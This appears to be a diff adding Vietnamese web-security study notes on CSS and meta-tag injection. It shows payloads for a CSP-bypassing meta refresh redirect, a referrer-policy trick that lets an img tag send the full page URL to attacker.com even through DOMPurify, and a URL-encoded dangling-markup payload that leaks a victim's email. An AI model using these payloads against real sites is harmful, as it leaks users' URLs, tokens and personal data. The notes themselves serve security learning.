@@ -143,3 +143,36 @@ HtmlSource
 ```
 - Url sẽ load như sau `https://target.com/vulnerable?html=%3Cimg+src%3Dhttps%3A%2F%2Fattacker.com+referrerpolicy%3Dunsafe-url%3E&leak=%3Cp%3EYour+email%3A+victim%40example.com%3C%2Fp%3E%0D%0A%3Cdiv+class%3D%22write-note%22%3E%0D%0A++%3Ctextarea%3E`
 
+## CSS Injection
+### Redirect 
+- Dùng `<meta>` (thẻ không bị chặn bới CSP) để chuyển hướng `user`
+```html
+<meta http-equiv="refresh" content="0; url=https://example.com">
+```
+### Referer
+- Thay đổi chính sách referrer `<meta name="referrer" content="unsafe-url">`
+```html
+Redirecting response
+
+HTTP/1.1 200 OK
+Content-Security-Policy: default-src 'none'
+Content-Type: text/html
+
+<meta name="referrer" content="unsafe-url">
+<meta http-equiv="Refresh" content="0,url=https://example.com">
+
+```
+- Điều thú vị là thẻ `<meta>` áp dụng cho toàn bộ trang, thậm chí khi sử dụng `DOMParser.parseFromString()` 
+- Điều đó có nghĩa là các bộ lọc  `sanitizer` phía `client` dùng hàm `parse` này có thể vô tình áp dụng chính sách `referrer` trước khi nội dung được `saniti` hóa!
+- Điều này tạo ra một cách rất đơn giản để làm rò rỉ URL hiện tại bằng DOMPurify: 
+```html
+<meta name="referrer" content="unsafe-url">
+<!-- Dù thẻ meta trên có thể bị DOMPurify saniti hóa đi,
+    nó vẫn có thể đã áp dụng chính sách referrer khi parsing,
+    khiến tag ảnh còn lại gửi toàn bộ URL tới attacker -->
+<img src="https://attacker.com">
+
+```
+
+#### Attribute Injection 
+
